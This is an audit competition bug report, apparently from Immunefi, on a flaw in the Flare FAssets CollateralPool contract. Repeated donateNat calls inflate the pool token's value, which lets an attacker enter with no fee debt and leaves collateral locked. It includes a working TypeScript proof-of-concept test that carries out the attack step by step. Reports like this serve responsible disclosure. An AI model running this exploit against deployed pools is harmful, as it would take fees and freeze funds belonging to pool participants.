# #47010 \[SC-Low] \`CollateralPool::donateNat\` manipulation enables arbitrary pool‐token value inflation and fee‐debt evasion

**Submitted on Jun 7th 2025 at 20:17:14 UTC by @NHristov for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #47010
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CollateralPool.sol>
* **Impacts:**
  * Theft of unclaimed yield
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

In `CollateralPool::enter`, new pool‐tokens are minted in proportion to

```
tokenShare ≃ poolTokenSupply × (depositNat / poolNatBalance)
```

Yet `CollateralPool::donateNat` lets anyone add up to ≈1% of the current `poolNatBalance` without minting tokens. By repeatedly donating just under that 1% cap, an attacker can inflate `poolNatBalance` while leaving `poolTokenSupply` fixed, so that

```
1 poolToken → poolNatBalance / poolTokenSupply
```

grows arbitrarily large. A single token can end up “worth” millions of NAT, breaking the economic invariants of the pool.

## Vulnerability Details

The core of the issue is that `CollateralPool::donateNat` does not mint any pool tokens while new pool tokens are minted in `CollateralPool::enter` in proportion to the amount of NAT deposited, but the pool's NAT balance can be inflated without minting any new tokens. This means that the value of a single pool token can be manipulated by repeatedly donating just under the 1% cap.

For example attack can be executes as follows based on the ratio `depositNat / poolNatBalance`.

* By repeatedly calling donateNat() with up to \~1% of the current `poolNatBalance`, an attacker can inflate poolNatBalance without increasing poolTokenSupply. Each donation multiplies the collateral base by \~1.01×, and after N donations:

```
poolNatBalance_final ≃ poolNatBalance_initial × 1.01^N
poolTokenSupply remains fixed
```

so that

```
1 poolToken → poolNatBalance_final / poolTokenSupply
```

grows exponentially. Once the ratio is enormous, an attacker can:

1. Exit 99% of their tokens (leaving ≥1 token) via `exit(tokens * 99/100)` and burns nearly all tokens, reducing poolTokenSupply to \~1–2, but leaves `totalCollateral` huge.
2. Redeem fees for “free”:

* After the manipulation loop, fAssetFeeDebtOf(attacker)==0, so calling enter(0, true) with a tiny deposit mints collateral-pool tokens at the inflated ratio, evading any owed f-asset fees.

3. That final 1 token now represents millions of NAT, which can never be withdrawn (exit requires ≥1 token after exit), locking enormous funds.

## Impact Details

* The last locked token in the pool can be worth millions of NAT, which can never be withdrawn.
* The attacker can redeem fees for “free” by entering the pool with a tiny deposit after inflating the pool's NAT balance.
* The economic invariants of the pool are broken, allowing for manipulation of the value of pool tokens.

## References

* [CollateralPool::donate nat link to github](https://github.com/flare-foundation/fassets/blob/fc727ee70a6d36a3d8dec81892d76d01bb22e7f1/contracts/assetManager/implementation/CollateralPool.sol#L855C1-L862C6)
* [CollateralPool::enter link to github](https://github.com/flare-foundation/fassets/blob/fc727ee70a6d36a3d8dec81892d76d01bb22e7f1/contracts/assetManager/implementation/CollateralPool.sol#L152C4-L185C6)

## Proof of Concept

## Proof Of Concept

The following unit test demonstrates the exploit:

To run the test paste the code in the CollateralPool.ts unit test file and execute it

```typescript
it("total collateral to pool tokens could be manipulated such way that one pool token is worth too much", async () => {
    // reduce ratio
    // since we need at least one more than 100e18 collateral to be able to donate the pool

    await collateralPool.enter(0, true, { value: ETH(101) });

    const tokens = await collateralPoolToken.debtFreeBalanceOf(accounts[0]);
    assertEqualBN(tokens, ETH(101));
    const tokenSupply = await collateralPoolToken.totalSupply();
    assertEqualBN(tokenSupply, ETH(101));
    const collateral = await wNat.balanceOf(collateralPool.address);
    assertEqualBN(collateral, ETH(101));

    // and there are 101 pool tokens right now to make the ratio worse
    // we can first donate so many token so that we reach a ratio of at least 1 pool token to : 100 nat tokens
    // after this we can substract from 99% of the pool tokens (which are currently 101)
    // so that the remaining pool tokens are more than the min constant
    // and then we execute the donation again
    // NOTE: this could be done even in more efficient way

    // donate wnat tokens
    // on each iteration we will donate the maximum amount which is 1%
    var currentCollateralSupply = await collateralPool.totalCollateral();
    const initialSupply = currentCollateralSupply;
    for (let i = 0; i < 700; i++) {
        //get one percent of the current token supply
        const onePercentOfCurrentTokenSupply = currentCollateralSupply.divn(100).subn(10);
        // donate one percent of the current token supply
        await collateralPool.donateNat({ value: onePercentOfCurrentTokenSupply });
        // add to the current total supply
        currentCollateralSupply = currentCollateralSupply.add(onePercentOfCurrentTokenSupply);
    }
    currentCollateralSupply = await collateralPool.totalCollateral();
    console.log(`donated supply: ${currentCollateralSupply.sub(initialSupply).toString()}`);
    console.log(`current collateral supply: ${currentCollateralSupply.toString()}`);

    const beforePoolTotalSupply = await collateralPoolToken.totalSupply();
    console.log(`before exit pool total supply: ${beforePoolTotalSupply.toString()}`);

    const tmpTokens = await collateralPoolToken.debtFreeBalanceOf(accounts[0]);
    const receipt = await collateralPool.exit(tmpTokens.muln(99).divn(100), TokenExitType.MINIMIZE_FEE_DEBT);

    //we need to maintain at least 100 collateral tokens
    currentCollateralSupply = await collateralPool.totalCollateral();
    console.log(`after exit current collateral supply: ${currentCollateralSupply.toString()}`);
    assert.isTrue(currentCollateralSupply.gte(ETH(100)), "current collateral supply is less than 100");
    const afterPoolTotalSupply = await collateralPoolToken.totalSupply();
    console.log(`after exit pool total supply: ${afterPoolTotalSupply.toString()}`);
    // assert that the pool token supply is less between 1 and 2
    assert.isTrue(afterPoolTotalSupply.gte(ETH(1)) && afterPoolTotalSupply.lte(ETH(2)), "pool token supply is not reduced enough");
    // currentRatio
    // the currentratio here is 1:1059
    // so one pool token is worth 1059 nat tokens
    const afterFirstIterationRatio = currentCollateralSupply.div(afterPoolTotalSupply);
    console.log(`after first iteration ratio: ${afterFirstIterationRatio.toString()}`);

    currentCollateralSupply = await collateralPool.totalCollateral();
    for (let i = 0; i < 700; i++) {
        //get one percent of the current token supply
        const onePercentOfCurrentTokenSupply = currentCollateralSupply.divn(100).subn(10);
        // donate one percent of the current token supply
        await collateralPool.donateNat({ value: onePercentOfCurrentTokenSupply });
        // add to the current total supply
        currentCollateralSupply = currentCollateralSupply.add(onePercentOfCurrentTokenSupply);
    }

    // after the second iteration we have 1:1121820
    // so one pool token is worth 1121820 nat tokens
    currentCollateralSupply = await collateralPool.totalCollateral();
    var afterSecondIterationRatio = currentCollateralSupply.div(afterPoolTotalSupply);
    console.log(`after second iteration ratio: ${afterSecondIterationRatio.toString()}`);
    //the amount of collateral here is
    // 1133038505974674431517232 or 1133038e18
    // which in flare tokens right now is 11 330 USD
    console.log(`after second iteration collateral: ${currentCollateralSupply.toString()}`);

    //we will add some fasset tokens
    //the decimals of the fxrp is 6, so big value of xrp could be fine
    //however if we take for example XBTC with 8 decimals, and the fees are 0.1 BTC
    //which right now is around 10_000 USD
    //a malicious user could enter the pool with the smallest amount of 1e18 native
    //and since the ratio of newly minted token share will be small (e.g. for 1 collateral 1 * 10^10/11 will be minted)
    // the fassetshare ratio will be 0 even tho there are virtual fees in the pool

    // we will give the max amount of fees right now that can give us 0 fasset shares
    //
    await givePoolFAssetFees(new BN(1_000_000));

    // there are fassets in the pool, we set that we want to enter with paying our debt
    // however if there are fees we would expect revert because we haven't allowed the transaction
    // and so we successfully can enter the pool and steal the fees by entering with small collateral
    await collateralPool.enter(0, true, { value: ETH(1), from: accounts[9] });
    const newTokens = await collateralPoolToken.debtFreeBalanceOf(accounts[0]);

    const feeDebt = await collateralPool.fAssetFeeDebtOf(accounts[9]);
    assertEqualBN(feeDebt, ETH(0), "fee debt should be zero, as we entered with no f-assets");

    //another very big issue here is that we can't withdraw the last pool token
    // and in our case it is equal to 1_121_820 flare so around 1_121_820 * 0.018 USD will stay frozen in the pool
});
```
